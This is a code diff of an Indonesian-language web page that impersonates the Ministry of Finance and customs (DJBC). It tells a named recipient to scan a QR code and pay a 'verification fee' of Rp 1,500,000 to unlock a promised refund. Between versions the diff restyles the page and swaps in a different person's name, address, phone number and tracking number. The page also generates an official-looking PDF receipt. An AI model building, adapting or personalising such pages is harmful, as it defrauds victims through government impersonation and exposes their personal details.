@@ -6,12 +6,13 @@
   <title>VERIFIKASI KLAIM REFUND & LEGALISASI DOKUMEN</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     body {
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       line-height: 1.6;
-      color: #1e293b;
-      background: #f8fafc;
+      color: #0d1b2a;
+      background: #f0f7ff;
       margin: 0;
       padding: 0;
       position: relative;
@@ -44,8 +45,8 @@
       margin: 40px auto;
       padding: 36px;
       background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(13, 59, 102, 0.12);
       position: relative;
       min-height: 100vh;
     }
@@ -63,20 +64,19 @@
       margin: 0 auto 20px;
       display: block;
       border: none;
-      background: transparent;
     }
 
     .header h1 {
       font-size: 2.0em;
       margin: 8px 0;
-      color: #0f172a;
+      color: #0d4a82;
       letter-spacing: 0.3px;
       font-weight: 700;
     }
 
     .header p {
       font-size: 1.15em;
-      color: #334155;
+      color: #1e4067;
       margin: 6px 0;
       font-weight: 600;
     }
@@ -89,35 +89,35 @@
     .verification-status {
       font-size: 1.45em;
       font-weight: 700;
-      color: #d97706; /* Amber-600 */
+      color: #0d4a82;
       margin-bottom: 12px;
-      position: relative;
-      display: inline-block;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
 
-    .verification-status::after {
-      content: '';
-      position: absolute;
-      bottom: -8px;
-      left: 50%;
-      transform: translateX(-50%);
+    .verification-status .icon {
+      font-size: 1.3em;
+      color: #0d4a82;
+    }
+
+    .verification-status .underline {
+      display: block;
       width: 200px;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, #f59e0b, transparent);
-      animation: pulseGlow 2.4s infinite;
-    }
-
-    @keyframes pulseGlow {
-      0% { transform: translateX(-50%) scaleX(0); opacity: 0; }
-      50% { opacity: 1; }
-      100% { transform: translateX(-50%) scaleX(1.1); opacity: 0; }
+      height: 2px;
+      background-color: #0d4a82;
+      margin-top: 8px;
+      margin-left: auto;
+      margin-right: auto;
+      border-radius: 1px;
     }
 
     .verification-note {
-      color: #475569;
+      color: #374151;
       font-size: 0.95em;
       max-width: 520px;
-      margin: 0 auto 20px;
+      margin: 16px auto 24px;
       line-height: 1.5;
     }
 
@@ -131,9 +131,9 @@
       height: 190px;
       padding: 12px;
       background: white;
-      border-radius: 14px;
-      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.09);
-      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(13, 59, 102, 0.1);
+      border: 1px solid #dbeafe;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -148,15 +148,15 @@
     .section {
       padding: 26px;
       margin: 22px 0;
-      border-radius: 12px;
-      background: #fff;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
-      border-left: 4px solid #f59e0b;
+      border-radius: 10px;
+      background: #f8fbff;
+      box-shadow: 0 2px 8px rgba(13, 59, 102, 0.05);
+      border-left: 4px solid #0d4a82;
     }
 
     .section h2 {
-      color: #0f172a;
-      border-bottom: 1.5px solid #f59e0b;
+      color: #0d1b2a;
+      border-bottom: 2px solid #0d4a82;
       padding-bottom: 6px;
       margin-top: 0;
       font-weight: 700;
@@ -171,15 +171,15 @@
     }
 
     .info-item {
-      background: #fffbeb;
+      background: #dbeafe;
       padding: 15px;
       border-radius: 10px;
       font-weight: 600;
-      border: 1px solid #fef08a;
+      border: 1px solid #bfdbfe;
     }
 
     .info-label {
-      color: #d97706;
+      color: #1d4ed8;
       display: block;
       margin-bottom: 6px;
       font-weight: 700;
@@ -188,10 +188,10 @@
 
     .btn-download {
       display: inline-block;
-      background: #1d4ed8; /* Indigo-700 */
+      background: #0d4a82;
       color: white;
       padding: 12px 30px;
-      border-radius: 10px;
+      border-radius: 8px;
       text-decoration: none;
       font-weight: 600;
       margin-top: 12px;
@@ -200,11 +200,11 @@
       border: none;
       cursor: pointer;
       font-size: 1em;
-      box-shadow: 0 4px 12px rgba(29, 78, 216, 0.25);
+      box-shadow: 0 4px 10px rgba(13, 74, 130, 0.25);
     }
 
     .btn-download:hover {
-      background: #1e40af;
+      background: #0b3d6b;
       transform: translateY(-2px);
     }
 
@@ -212,8 +212,8 @@
       text-align: center;
       margin-top: 45px;
       padding-top: 22px;
-      border-top: 1px solid #e2e8f0;
-      color: #64748b;
+      border-top: 1px solid #dbeafe;
+      color: #4b5563;
       font-size: 0.85em;
       font-weight: 500;
     }
@@ -225,15 +225,15 @@
 
     li {
       margin-bottom: 8px;
-      color: #334155;
+      color: #1e293b;
     }
 
     code {
-      background: #f1f5f9;
+      background: #dbeafe;
       padding: 2px 6px;
       border-radius: 4px;
       font-family: monospace;
-      color: #0f172a;
+      color: #0d1b2a;
     }
 
     @media (max-width: 768px) {
@@ -263,7 +263,7 @@
 
   <div class="container">
 
-    <!-- Header with New Logo -->
+    <!-- Header -->
     <div class="header">
       <img src="https://i.ibb.co.com/994BZQMh/IMG-20251207-094853.jpg" alt="Logo Resmi Instansi" class="logo-djbc">
       <h1>KEMENTERIAN KEUANGAN REPUBLIK INDONESIA</h1>
@@ -272,10 +272,13 @@
 
     <!-- Verification Badge -->
     <div class="verification-badge">
-      <div class="verification-status">PENDING — MENUNGGU SCAN KODE AKSES</div>
+      <div class="verification-status">
+        <i class="icon fas fa-clock"></i>
+        PENDING — MENUNGGU SCAN KODE AKSES
+      </div>
+      <div class="underline"></div>
       <div class="verification-note">Silakan scan QR Code di bawah untuk memverifikasi pembayaran dan mengaktifkan proses refund.</div>
       
-      <!-- QR Code Statis -->
       <div class="qr-container">
         <a href="https://ibb.co.com/yn7khHF0" target="_blank" rel="noopener noreferrer">
           <div class="qr-frame">
@@ -291,19 +294,19 @@
       <div class="info-grid">
         <div class="info-item">
           <span class="info-label">Nama Penerima</span>
-          Aan
+          Ahim Dg Lolo
         </div>
         <div class="info-item">
           <span class="info-label">Alamat Lengkap</span>
-          Jl. Urip Sumoharjo, Kel. Bukir, Kec. Gadingrejo,<br>Kab. Pasuruan, Jawa Timur, 67138
+          Jl. Suka 5, Desa Anggana, Kec. Anggana,<br>Kab. Kutai Kartanegara, Kalimantan Timur 75381
         </div>
         <div class="info-item">
           <span class="info-label">Nomor Telepon</span>
-          +62 858 5503 3883
+          +62 822-2350-9049
         </div>
         <div class="info-item">
           <span class="info-label">Nomor Resi</span>
-          001797568821
+          001797568962
         </div>
       </div>
     </div>
@@ -314,7 +317,7 @@
       <div class="info-grid">
         <div class="info-item">
           <span class="info-label">Nomor Resi</span>
-          001797568821
+          001797568962
         </div>
         <div class="info-item">
           <span class="info-label">Jenis Barang</span>
@@ -322,7 +325,7 @@
         </div>
         <div class="info-item">
           <span class="info-label">Jumlah</span>
-          3 slop (600 batang)
+          15 slop
         </div>
       </div>
     </div>
@@ -330,14 +333,14 @@
     <!-- VERIFIKASI & REFUND -->
     <div class="section">
       <h2>III. STATUS VERIFIKASI & REFUND</h2>
-      <p><strong>Kode Akses:</strong> <code>REF-2025-001797568821</code></p>
-      <p><strong>Biaya Verifikasi:</strong> Rp 1.250.000,00</p>
-      <p><strong>Total Refund:</strong> Rp 2.375.000,00</p>
-      <p>Status: <strong style="color: #d97706;">⏳ Pending — Menunggu Scan</strong></p>
+      <p><strong>Kode Akses:</strong> <code>REF-2025-001797568962</code></p>
+      <p><strong>Biaya Verifikasi:</strong> Rp 1.500.000,00</p>
+      <p><strong>Total Refund:</strong> Rp 2.850.000,00</p>
+      <p>Status: <strong style="color: #0d4a82;"><i class="fas fa-clock"></i> Pending — Menunggu Scan</strong></p>
       <button class="btn-download" onclick="generatePDF()">📥 DOWNLOAD DOKUMEN VERIFIKASI (PDF)</button>
     </div>
 
-    <!-- Teks Resmi yang Diminta -->
+    <!-- Teks Resmi -->
     <div class="section">
       <h2>IV. VERIFIKASI KODE AKSES UNTUK KLAIM PENGEMBALIAN DANA (REFUND) DAN LEGALISASI DOKUMEN</h2>
       <p>Dalam rangka memenuhi prosedur administratif yang berlaku, proses verifikasi kode akses merupakan syarat utama dan wajib yang harus diselesaikan terlebih dahulu sebelum pemohon dapat melanjutkan ke tahapan berikut:</p>
@@ -346,7 +349,7 @@
         <li>Penerbitan dokumen legalitas oleh instansi atau pihak yang berwenang.</li>
       </ol>
       <p><strong>Jumlah yang Wajib Diselesaikan:</strong><br>
-      <strong>Rp 1.250.000,00</strong> (Satu Juta Dua Ratus Lima Puluh Ribu Rupiah)<br>
+      <strong>Rp 1.500.000,00</strong> (Satu Juta Lima Ratus Ribu Rupiah)<br>
       <em>(Untuk keperluan kode akses penyesuaian data)</em></p>
       <p>Harap diperhatikan bahwa setiap bentuk keterlambatan maupun kegagalan dalam menyelesaikan verifikasi kode akses dapat menyebabkan penundaan bahkan pembatalan otomatis terhadap seluruh proses pengajuan refund dan legalisasi dokumen yang sedang berlangsung.</p>
     </div>
@@ -357,17 +360,17 @@
       <ol>
         <li>
           <strong>Pengajuan Legalitas</strong><br>
-          Nilai pengajuan: Rp 1.250.000,00<br>
+          Nilai pengajuan: Rp 1.500.000,00<br>
           Potongan biaya administrasi: 10%<br>
-          Dana yang dikembalikan: <strong>Rp 1.125.000,00</strong>
+          Dana yang dikembalikan: <strong>Rp 1.350.000,00</strong>
         </li>
         <li>
           <strong>Verifikasi Klaim</strong><br>
-          Kode akses penyesuaian data: Rp 1.250.000,00<br>
+          Kode akses penyesuaian  Rp 1.500.000,00<br>
           Digunakan untuk proses verifikasi data pusat dan validasi administrasi
         </li>
       </ol>
-      <p><strong>Total Dana yang Akan Dikembalikan: Rp 2.375.000,00</strong></p>
+      <p><strong>Total Dana yang Akan Dikembalikan: Rp 2.850.000,00</strong></p>
       <p>Pengembalian dana akan diproses secara otomatis dalam estimasi waktu <strong>5–10 menit</strong> setelah seluruh tahapan verifikasi diselesaikan. Dana akan ditransfer langsung ke rekening penerima yang telah terdaftar dan diverifikasi secara sah.</p>
     </div>
 
@@ -406,13 +409,13 @@
       doc.line(20, 40, 190, 40);
 
       doc.setFontSize(11);
-      doc.text("Nomor Resi       : 001797568821", 20, 50);
-      doc.text("Nama Penerima    : Aan", 20, 58);
+      doc.text("Nomor Resi       : 001797568962", 20, 50);
+      doc.text("Nama Penerima    : Ahim Dg Lolo", 20, 58);
       doc.text("Tanggal Verifikasi: 07 Desember 2025", 20, 66);
-      doc.text("Kode Akses       : REF-2025-001797568821", 20, 74);
+      doc.text("Kode Akses       : REF-2025-001797568962", 20, 74);
       doc.text("Status           : PENDING — Menunggu Scan", 20, 82);
 
-      const qrData = "REF-2025-001797568821|AAN|PENDING|DJBC-VERIFIKASI";
+      const qrData = "REF-2025-001797568962|AHIM DG LOLO|PENDING|DJBC-VERIFIKASI";
       const canvas = document.getElementById('qrCanvas');
       QRCode.toCanvas(canvas, qrData, { width: 150, margin: 2 }, function (error) {
         if (error) console.error(error);
@@ -421,7 +424,7 @@
         doc.setFontSize(9);
         doc.setTextColor(100);
         doc.text("Scan QR Code ini untuk memverifikasi pembayaran dan mengaktifkan proses refund.", 105, 155, null, null, "center");
-        doc.save("Verifikasi_Refund_001797568821.pdf");
+        doc.save("Verifikasi_Refund_001797568962.pdf");
       });
     }
   </script>
